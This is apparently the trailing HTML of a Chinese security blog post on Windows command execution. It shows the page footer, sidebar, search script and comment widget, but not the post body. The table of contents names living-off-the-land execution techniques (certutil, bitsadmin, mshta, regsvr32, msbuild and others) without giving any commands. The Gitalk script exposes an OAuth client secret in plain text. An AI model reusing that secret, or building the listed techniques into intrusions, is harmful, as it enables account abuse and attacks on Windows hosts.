+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>SuNu11</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    
+    <a href="http://sunu11.com/2019/09/02/windows下命令执行/" title="windows下命令执行">http://sunu11.com/2019/09/02/windows下命令执行/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/31/解决android模拟器抓包环境问题/" rel="next" title="解决android模拟器抓包环境问题">
+                <i class="fa fa-chevron-left"></i> 解决android模拟器抓包环境问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/03/参考文章/" rel="prev" title="参考文章">
+                参考文章 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/me.png" alt="SuNu11">
+            
+              <p class="site-author-name" itemprop="name">SuNu11</p>
+              <p class="site-description motion-element" itemprop="description">淡泊以明志，宁静以致远</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">36</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">46</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N1bnUxMQ==" title="GitHub &rarr; https://github.com/sunu11"><i class="fa fa-fw fa-github"></i>GitHub</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="bWFpbHRvOjk1ODEzMDQyMUBxcS5jb20=" title="E-Mail &rarr; mailto:958130421@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cDovL3dlaWJvLmNvbS9zdW51MTE=" title="Weibo &rarr; http://weibo.com/sunu11"><i class="fa fa-fw fa-weibo"></i>Weibo</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9zdV9udTEx" title="Twitter &rarr; https://twitter.com/su_nu11"><i class="fa fa-fw fa-twitter"></i>Twitter</span>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Friends
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5zZWMtcmVkY2x1Yi5jb20v" title="http://www.sec-redclub.com/">Redbu11</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL2RicWYueHl6Lw==" title="http://dbqf.xyz/">大兄弟(独步清风)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy52aXJ6ei5jb20v" title="http://www.virzz.com/">V神(Virink)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5tb25idXJhbi5jbi8=" title="http://www.monburan.cn/">大兄弟(Monburan)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9uMWdodHdhdGNoZXIv" title="http://www.cnblogs.com/n1ghtwatcher/">老哥(n1ghtwatcher)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5nbGFtb3Iuc2l0ZS8=" title="http://www.glamor.site/">大诏(glamor)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGlhb21pYW9ob25nY2hlbi8=" title="https://www.cnblogs.com/piaomiaohongchen/">超神哥</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3FjbG92ZXIuY24=" title="http://qclover.cn">华清(Qclover)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cHM6Ly9sb25lbHlzZWMuY29tLw==" title="https://lonelysec.com/">薯片(CK)</span>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景："><span class="nav-number">1.</span> <span class="nav-text">背景：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方式"><span class="nav-number">2.</span> <span class="nav-text">方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#certutil"><span class="nav-number">2.1.</span> <span class="nav-text">certutil</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell"><span class="nav-number">2.2.</span> <span class="nav-text">powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bitsadmin"><span class="nav-number">2.3.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CScript-WScript"><span class="nav-number">2.4.</span> <span class="nav-text">CScript/WScript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSC"><span class="nav-number">2.5.</span> <span class="nav-text">CSC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FTP"><span class="nav-number">2.6.</span> <span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JScript"><span class="nav-number">2.7.</span> <span class="nav-text">JScript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#regsvr32"><span class="nav-number">2.8.</span> <span class="nav-text">regsvr32</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mshta"><span class="nav-number">2.9.</span> <span class="nav-text">mshta</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rundll32"><span class="nav-number">2.10.</span> <span class="nav-text">rundll32</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pubprn-vbs"><span class="nav-number">2.11.</span> <span class="nav-text">pubprn.vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#winrm-vbs-slmgr-vbs"><span class="nav-number">2.12.</span> <span class="nav-text">winrm.vbs/slmgr.vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msiexec"><span class="nav-number">2.13.</span> <span class="nav-text">msiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IEExec"><span class="nav-number">2.14.</span> <span class="nav-text">IEExec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cmd"><span class="nav-number">2.15.</span> <span class="nav-text">Cmd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Regasm-Regsvc"><span class="nav-number">2.16.</span> <span class="nav-text">Regasm/Regsvc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Msbuild"><span class="nav-number">2.17.</span> <span class="nav-text">Msbuild</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pcalua-exe"><span class="nav-number">2.18.</span> <span class="nav-text">pcalua.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cmstp"><span class="nav-number">2.19.</span> <span class="nav-text">Cmstp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MavInject32"><span class="nav-number">2.20.</span> <span class="nav-text">MavInject32</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Odbcconf"><span class="nav-number">2.21.</span> <span class="nav-text">Odbcconf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他"><span class="nav-number">2.22.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <span class="exturl" data-url="aHR0cDovL3d3dy5taWl0YmVpYW4uZ292LmNu">京ICP备16045158号 </span>&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SuNu11</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Mist</span></div>
+
+
+
+
+        
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1275798487&web_id=1275798487"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+    
+  <link rel="stylesheet" href="/css/gitalk.css">
+  <script src="/js/src/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'daf81de63d9e084c5c7e',
+          clientSecret: 'f7fb861f10ddc5fd1292da542d50e34d0153be8a',
+          repo: 'blog-comment',
+          owner: 'sunu11',
+          admin: ['sunu11'],
+          id: md5( location.pathname ),
+          distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script src="/js/src/exturl.js?v=6.7.0"></script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
